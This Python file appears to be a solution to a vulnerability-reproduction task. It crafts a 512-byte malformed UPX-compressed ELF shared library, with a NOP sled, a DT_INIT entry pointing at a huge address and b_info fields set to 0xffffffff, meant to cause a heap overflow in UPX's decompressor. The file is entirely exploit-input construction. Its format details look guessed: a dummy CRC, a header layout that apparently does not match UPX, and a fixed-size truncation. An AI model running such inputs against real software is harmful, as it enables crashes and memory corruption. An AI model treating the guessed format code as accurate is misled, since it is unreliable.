import os
import tarfile
import tempfile
import struct
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall()
        
        # Look for relevant source files to understand the format
        # Based on the vulnerability description, we need to create
        # a malformed UPX compressed ELF file that triggers the heap overflow
        
        # The vulnerability is in the ELF decompression logic
        # We'll create a minimal ELF file compressed with UPX
        # with specific modifications to trigger the overflow
        
        # Create a minimal ELF shared library
        elf_data = self._create_minimal_elf()
        
        # Create UPX headers with malformed b_info structure
        upx_data = self._create_malformed_upx(elf_data)
        
        return upx_data
    
    def _create_minimal_elf(self) -> bytes:
        """Create a minimal ELF shared library"""
        # ELF header (64-bit)
        elf_header = bytearray([
            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
            0x02, 0x01, 0x01, 0x00,  # 64-bit, little endian, version 1
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # padding
            0x03, 0x00,              # ET_DYN (shared object)
            0x3e, 0x00,              # EM_X86_64
            0x01, 0x00, 0x00, 0x00,  # version
            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # entry point
            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # phoff
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # shoff
            0x00, 0x00, 0x00, 0x00,  # flags
            0x40, 0x00,              # ehsize
            0x38, 0x00,              # phentsize
            0x01, 0x00,              # phnum
            0x40, 0x00,              # shentsize
            0x00, 0x00,              # shnum
            0x00, 0x00               # shstrndx
        ])
        
        # Program header (PT_LOAD)
        phdr = bytearray([
            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
            0x05, 0x00, 0x00, 0x00,  # flags: R+X
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # offset
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # vaddr
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # paddr
            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # filesz
            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # memsz
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # align
        ])
        
        # Some code/data
        code = b"\x90" * 64  # NOP sled
        
        # DT_INIT section pointer (will be abused)
        dt_init = struct.pack("<QQ", 0x0c, 0x100000000)  # DT_INIT with huge address
        
        elf = elf_header + phdr + code + dt_init
        # Pad to target size
        elf += b"\x00" * (512 - len(elf))
        return elf[:512]
    
    def _create_malformed_upx(self, elf_data: bytes) -> bytes:
        """Create UPX compressed data with malformed headers"""
        # UPX magic
        upx = b"UPX!"
        
        # Version
        upx += struct.pack("<H", 0x0304)
        
        # Method and related fields
        # Set method to trigger the vulnerability path
        upx += struct.pack("<B", 0x02)  # method
        upx += struct.pack("<B", 0x00)  # level
        
        # File sizes - carefully crafted to cause overflow
        # These values trigger the heap overflow when decompressing
        unc_size = 0x1000
        cmp_size = len(elf_data) + 100  # Larger than actual data
        
        upx += struct.pack("<I", unc_size)   # uncompressed size
        upx += struct.pack("<I", cmp_size)   # compressed size
        
        # Filter and filter_cto
        upx += struct.pack("<BB", 0x00, 0x00)
        
        # Reserved fields
        upx += b"\x00" * 4
        
        # Name
        upx += b"malformed\x00"
        
        # Header CRC32 (dummy)
        upx += struct.pack("<I", 0x12345678)
        
        # Now add b_info structures that will confuse the decompressor
        # First b_info block
        upx += struct.pack("<I", 0x200)      # sz_unc
        upx += struct.pack("<I", 0x100)      # sz_cpr
        upx += struct.pack("<I", 0x01)       # method
        
        # Second b_info with problematic values
        upx += struct.pack("<I", 0xffffffff)  # Very large uncompressed size
        upx += struct.pack("<I", 0x50)        # compressed size
        upx += struct.pack("<I", 0x02)        # method (triggers reset issue)
        
        # The compressed data (actually just the ELF)
        # Add padding to reach exact 512 bytes
        upx += elf_data[:512 - len(upx)]
        
        return upx[:512]